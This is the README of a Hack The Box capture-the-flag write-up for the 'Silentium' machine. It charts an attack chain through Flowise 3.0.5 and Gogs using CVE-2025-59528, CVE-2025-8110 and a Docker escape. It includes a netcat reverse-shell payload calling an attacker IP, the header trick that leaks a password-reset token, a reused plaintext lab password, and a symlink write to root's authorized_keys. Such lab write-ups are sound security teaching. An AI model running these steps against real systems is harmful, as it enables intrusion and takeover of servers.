# Silentium

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![CVE-2025-59528](https://img.shields.io/badge/CVE--2025--59528-RCE-red?style=for-the-badge)
![CVE-2025-8110](https://img.shields.io/badge/CVE--2025--8110-PathTraversal-red?style=for-the-badge)
![Docker](https://img.shields.io/badge/Docker-Container%20Escape-purple?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)

> Hack The Box — Easy Linux machine. A fictional institutional finance firm running a vulnerable AI agent platform (Flowise 3.0.5) and an internal Git service (Gogs). Exploitation requires chaining four vulnerabilities across two services plus a Docker container escape.

---

## Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         SILENTIUM — ATTACK CHAIN                        │
└─────────────────────────────────────────────────────────────────────────┘

[1] RECONNAISSANCE
    nmap -p- → ports 22 (SSH), 80 (HTTP/nginx)
    gobuster vhost → staging.silentium.htb
         │
         ▼
[2] FLOWISE DISCOVERY
    http://staging.silentium.htb
    /api/v1/version → {"version":"3.0.5"}
    CVE research → CVE-2025-59528 (RCE), CVE-2025-59527 (SSRF)
         │
         ▼
[3] AUTHENTICATION BYPASS — INFO DISCLOSURE
    POST /api/v1/account/forgot-password
    Header: x-request-from: internal
    Response leaks tempToken in JSON body
    → Password reset for ben@silentium.htb
    → Login → API Key obtained
         │
         ▼
[4] RCE — CVE-2025-59528
    CustomMCP node → mcpServerConfig field
    Payload: sh -c 'nc 10.10.15.77 4444 -e /bin/sh'
    (bash not available in container — must use sh + nc)
    → Reverse shell as root (Docker container)
         │
         ▼
[5] DOCKER CONTAINER ESCAPE
    env → SMTP_PASSWORD=r04D!!_R4ge
    nc -zv 172.18.0.1 22 → SSH port open
    ssh ben@10.129.29.143 (password reuse)
    → Shell on host as ben
         │
         ▼
[6] USER FLAG
    cat ~/user.txt ✅
         │
         ▼
[7] INTERNAL ENUMERATION
    ss -tlnp → port 3001 (Gogs), 8025 (MailHog)
    /opt/gogs/gogs/custom/conf/app.ini
    → Gogs RUN_USER=root, HTTP_PORT=3001
    ssh -L 8081:127.0.0.1:3001 ben@10.129.29.143
         │
         ▼
[8] PRIVILEGE ESCALATION — CVE-2025-8110
    Gogs open registration → create account
    CVE-2025-8110: symlink traversal via PutContents API
    Symlink: payload → /root/.ssh/authorized_keys
    Write SSH public key through symlink
    ssh -i /tmp/rootkey root@10.129.29.143
         │
         ▼
[9] ROOT FLAG
    cat /root/root.txt ✅
```

---

## Vulnerabilities Exploited

| # | Vulnerability | CVE | CVSS | Service | Impact |
|---|---------------|-----|------|---------|--------|
| 1 | Password Reset Token Disclosure | — | High | Flowise 3.0.5 | Account takeover (ben) |
| 2 | CustomMCP JS Code Injection | CVE-2025-59528 | 10.0 | Flowise 3.0.5 | RCE in Docker container |
| 3 | Credential Exposure in Environment Variables | — | High | Docker | SSH access as ben |
| 4 | Symlink Path Traversal in PutContents API | CVE-2025-8110 | 8.7 | Gogs ≤ 0.13.3 | Arbitrary file write as root |

---

## Techniques Used

| Technique | MITRE ATT&CK |
|-----------|-------------|
| Virtual Host Enumeration | T1046 |
| Information Disclosure — API Response | T1552.001 |
| Remote Code Execution via Web App | T1190 |
| Container Escape via Credential Harvesting | T1552.007 |
| SSH Lateral Movement | T1021.004 |
| Privilege Escalation via File Write | T1574 |

---

## Files in This Folder

| File | Description |
|------|-------------|
| `WALKTHROUGH.md` | Full step-by-step exploitation walkthrough with failed attempts and analysis |
| `MITIGATIONS.md` | Blue Team reference — OWASP/CWE/MITRE ATT&CK classifications and defense-in-depth recommendations |
| `README.md` | This file — attack chain overview and vulnerability summary |
